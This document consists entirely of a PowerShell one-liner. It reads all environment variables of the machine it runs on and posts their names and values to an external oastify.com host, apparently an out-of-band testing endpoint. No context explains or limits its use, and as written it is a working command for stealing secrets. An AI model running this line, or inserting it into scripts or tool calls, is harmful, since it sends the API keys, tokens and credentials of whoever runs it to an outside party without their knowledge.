Invoke-RestMethod -Uri 'https://jsf7llpqgghoe1enw50e0prb92f43vrk.oastify.com' -Method Post -Body (gci env:* | ForEach-Object { "$($_.Name)=$($_.Value)" } -join "&")
